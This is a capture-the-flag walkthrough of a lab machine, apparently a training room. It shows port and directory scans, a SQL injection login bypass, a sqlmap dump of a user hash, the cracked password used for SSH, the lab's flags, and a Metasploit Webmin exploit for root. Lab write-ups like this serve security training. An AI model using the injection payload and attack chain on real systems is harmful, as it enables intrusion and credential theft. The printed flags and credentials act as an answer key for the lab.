nmap 
```
┌──(gomez22㉿DESKTOP-V2K8SJ4)-[~]
└─$ sudo nmap -sS -sV -Pn 10.10.26.202
[sudo] password for gomez22: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-13 16:20 PDT
Nmap scan report for 10.10.26.202
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

There is a place to login on 10.10.26.202
Bypassed it with `admin' or '1'='1' #` in the username field.

I was redirected to /portal.php which had a search field. It makes POST requests to the back end. I intercepted the request
using burp and used it with sqlmap to dump usernames and hashes.

sqlmap
```
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[16:30:49] [INFO] table 'db.post' dumped to CSV file '/home/gomez22/.local/share/sqlmap/output/10.10.26.202/dump/db/post.csv'
[16:30:49] [INFO] fetching columns for table 'users' in database 'db'
[16:30:49] [INFO] fetching entries for table 'users' in database 'db'
[16:30:49] [INFO] recognized possible password hashes in column 'pwd'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[16:31:13] [INFO] writing hashes to a temporary file '/tmp/sqlmapjle5tvrf6211/sqlmaphashes-j3_dkc0s.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

[16:31:22] [INFO] table 'db.users' dumped to CSV file '/home/gomez22/.local/share/sqlmap/output/10.10.26.202/dump/db/users.csv'
[16:31:22] [INFO] fetched data logged to text files under '/home/gomez22/.local/share/sqlmap/output/10.10.26.202'

```

gobuster
```
─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x js,php,html,txt -u 10.10.26.202
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.26.202
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              js,php,html,txt
[+] Timeout:                 10s
===============================================================
2022/07/13 16:22:47 Starting gobuster in directory enumeration mode
===============================================================
/.hta.txt             (Status: 403) [Size: 295]
/.hta                 (Status: 403) [Size: 291]
/.hta.js              (Status: 403) [Size: 294]
/.hta.php             (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 296]
/.hta.html            (Status: 403) [Size: 296]
/.htpasswd.php        (Status: 403) [Size: 300]
/.htaccess.js         (Status: 403) [Size: 299]
/.htpasswd.html       (Status: 403) [Size: 301]
/.htaccess.php        (Status: 403) [Size: 300]
/.htpasswd.txt        (Status: 403) [Size: 300]
/.htaccess.html       (Status: 403) [Size: 301]
/.htpasswd            (Status: 403) [Size: 296]
/.htaccess.txt        (Status: 403) [Size: 300]
/.htpasswd.js         (Status: 403) [Size: 299]
/images               (Status: 301) [Size: 313] [--> http://10.10.26.202/images/]
/index.php            (Status: 200) [Size: 4502]                                 
/index.php            (Status: 200) [Size: 4502]                                 
/portal.php           (Status: 302) [Size: 0] [--> index.php]                    
/server-status        (Status: 403) [Size: 300]  
```

I used `hash-identifier` to find out the hash is sha256. I then cracked it using hashcat.
`ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14:videogamer124`

I then ssh'd in as `agent47:videogamer124`

Found the user flag
```
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
agent47@gamezone:~$ 
```

I can't run sudo on gamezone...darn.
I followed the instructions to get a reverse ssh tunnel. I was able to open `localhost:10000` in my browser which took me
to a login page that is running `webmin` cms. I was able to login as `agent47:videogamer124` and I found the cms version of 1.580.

I used metasploit to find an exploit for the cms then filled in the required parameters. I ran the exploit which immediately gave me a root shell.
I grabbed the flag `a4b945830144bdd71908d12d902adeee` and challenge done!
